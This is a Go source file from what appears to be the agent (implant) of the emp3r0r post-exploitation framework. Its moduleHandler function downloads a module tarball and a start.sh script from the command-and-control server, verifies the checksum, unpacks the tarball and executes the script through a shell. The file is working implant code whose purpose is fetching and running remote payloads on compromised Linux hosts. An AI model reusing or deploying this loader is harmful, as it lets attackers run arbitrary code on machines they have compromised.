//go:build linux
// +build linux

package agent

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/mholt/archiver"
)

func moduleHandler(modName, checksum string) (out string) {
	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
	modDir := emp3r0r_data.AgentRoot + "/" + modName
	start_sh := modDir + "/start.sh"

	// if we have already downloaded the module, dont bother downloading again
	if tun.SHA256SumFile(tarball) != checksum {
		_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".tar.bz2",
			tarball)
		if err != nil {
			return err.Error()
		}
	}

	if tun.SHA256SumFile(tarball) != checksum {
		log.Print("checksum failed, restarting...")
		os.RemoveAll(tarball)
		moduleHandler(modName, checksum)
	}

	// extract files
	os.RemoveAll(modDir)
	if err := archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
		return err.Error()
	}

	// download start.sh
	os.RemoveAll(start_sh)
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".sh",
		start_sh)
	if err != nil {
		return err.Error()
	}

	// exec
	pwd, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("pwd: %v", err)
	}
	err = os.Chdir(modDir)
	if err != nil {
		return fmt.Sprintf("cd to module dir: %v", err)
	}
	defer os.Chdir(pwd)

	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)

	// debug
	shdata, err := ioutil.ReadFile(start_sh)
	if err != nil {
		log.Printf("Read %s: %v", start_sh, err)
	}
	log.Printf("Running start.sh %s", shdata)

	outbytes, err := cmd.CombinedOutput()
	if err != nil {
		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
	}
	defer os.RemoveAll(modDir)

	return string(outbytes)
}
